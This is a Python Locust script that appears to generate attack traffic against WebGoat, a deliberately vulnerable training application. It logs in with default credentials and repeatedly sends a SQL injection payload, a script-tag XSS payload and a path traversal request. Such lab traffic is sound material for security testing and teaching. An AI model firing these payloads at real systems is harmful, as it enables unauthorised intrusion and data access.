import time
from locust import HttpUser, task, between

class WebGoat(HttpUser):

    @task
    def exploitSqlInjection(self):
        payload = {'station': '101 or 1=1!', 'SUBMIT': 'Go!'}
        self.client.post("/WebGoat/attack?Screen=101829144&menu=1100", data = payload, name = 'Exploit SQL Injection')

    @task
    def exploitXss(self):
        payload = {
            'firstName': 'Tom',
            'lastName': 'Cat',
            'address1': '<script>alert(1)</script>',
            'address2': 'New York, NY',
            'phoneNumber': '443-599-0762',
            'startDate': '1011999',
            'ssn': '792-14-6364',
            'salary': '80000',
            'ccn': '5481360857968521',
            'ccnLimit': '30000',
            'description': 'Co-Owner.',
            'manager': '105',
            'disciplinaryNotes': 'NA',
            'disciplinaryDate': '0',
            'employee_id': '105',
            'title': 'Engineer',
            'action': 'UpdateProfile'
        }

        self.client.post('/WebGoat/attack?Screen=611366032&menu=900&stage=1', data = payload, name = 'Exploit XSS')

    @task
    def exploitPathTraversal(self):
        payload = {'File': '../main.jsp', 'SUBMIT': 'View File'}
        self.client.post("/WebGoat/attack?Screen=231255157&menu=200", data = payload, name = 'Exploit Path Traversal')

    def on_start(self):
        credential = {'username': 'webgoat', 'password': 'webgoat'}
        self.client.post('/WebGoat/j_spring_security_check', data = credential)
